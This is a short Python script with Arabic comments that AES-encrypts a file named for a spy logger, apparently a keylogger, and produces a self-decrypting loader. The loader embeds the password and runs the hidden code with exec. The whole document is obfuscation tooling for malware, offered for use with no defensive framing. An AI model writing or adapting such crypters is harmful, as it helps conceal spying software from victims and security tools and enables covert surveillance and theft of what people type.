# encrypt_anaslogger_aes.py
from Crypto.Cipher import AES
import base64
import os
from hashlib import sha256

def pad(data):
    return data + b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt(raw, password):
    raw = pad(raw)
    key = sha256(password.encode()).digest()
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(raw)
    return base64.b64encode(iv + encrypted).decode()

# اقرأ سكربت AnasSpyLogger الأصلي
with open("anasspylogger.py", "rb") as f:
    script_data = f.read()

# اختر كلمة سر التشفير
password = "nethunter2006"  # يمكنك تغييرها

# شفر السكربت
encrypted_code = encrypt(script_data, password)

# أنشئ سكربت مشفر
with open("AnasSpyLogger_AES.py", "w") as f:
    f.write(f"""
import base64
from Crypto.Cipher import AES
from hashlib import sha256

def unpad(data):
    return data.rstrip(b"\\0")

def decrypt(enc, password):
    enc = base64.b64decode(enc)
    key = sha256(password.encode()).digest()
    iv = enc[:16]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(enc[16:])
    return unpad(decrypted)

enc_code = \"\"\"{encrypted_code}\"\"\"
password = "{password}"
exec(compile(decrypt(enc_code, password), "<string>", "exec"))
""")
